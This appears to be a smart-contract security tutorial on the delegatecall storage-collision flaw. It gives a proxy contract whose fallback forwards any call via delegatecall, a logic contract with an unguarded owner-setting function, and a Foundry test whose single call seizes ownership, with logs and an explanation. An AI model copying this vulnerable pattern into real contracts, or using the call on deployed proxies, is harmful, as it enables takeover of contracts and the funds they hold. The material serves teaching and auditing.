# Delegate

``` text copy
contract Delegate {
    address public owner; 
    function pwn() public {
        owner = msg.sender;
    }
}
```

# Proxy

``` text copy
contract Proxy {
    address public owner = address(0xdeadbeef); // slot0
    Delegate delegate;
    constructor(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
    }

    fallback() external {
        (bool suc,) = address(delegate).delegatecall(msg.data); 
        require(suc, "Delegatecall failed");
    }
}
```

# ContractTest

``` text copy
contract ContractTest is Test {
    Proxy proxy;
    Delegate DelegateContract;
    address alice;

    function setUp() public {
        alice = Makeaddr("alice");
    }

    function testDelegatecall() public {
        DelegateContract = new Delegate();              // logic contract
        proxy = new Proxy(address(DelegateContract));   // proxy contract
        console.log("Alice address", alice);
        console.log("DelegationContract owner", proxy.owner());
        
        // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.
        console.log("Change DelegationContract owner to Alice...");
        vm.prank(alice);
        
        address(proxy).call(abi.encodeWithSignature("pwn()")); // exploit here
        console.log("DelegationContract owner", proxy.owner());
    }
}
```

``` text copy
Logs:
    Alice address 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6
    DelegationContract owner 0x00000000000000000000000000000000DeaDBeef
    Change DelegationContract owner to Alice...
    DeleGationContract owner 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6
```

``` text copy
DelegateContract = new Delegate();  // logic contract
proxy = new Proxy(address(DelegateContract));   // proxy contract
```

``` text copy
console.log("Alice address", alice);
console.log("DelegationContract owner", proxy.owner());
console.log("Change DelegationContract owner to Alice...");
vm.prank(alice);
```

``` text copy
address(proxy).call(abi.encodeWithSignature("pwn()")); // exploit here
console.log("DelegationContract owner", proxy.owner());
```

How?

``` text copy
address(proxy).call(abi.encodeWithSignature("pwn()"));
```

There is no pwn function in proxy contract and this falls to fallback function in proxy contract.

``` text copy
(bool suc,) = address(delegate).delegatecall(msg.data);
```

Fallback function delegatecall to delegate address with msg.data (abi.encodeWithSignature(“pwn()”))

``` text copy
function pwn() public {
    owner = msg.sender;
}
```

In the delegate contract, msg.sender will be owner also in proxy contract.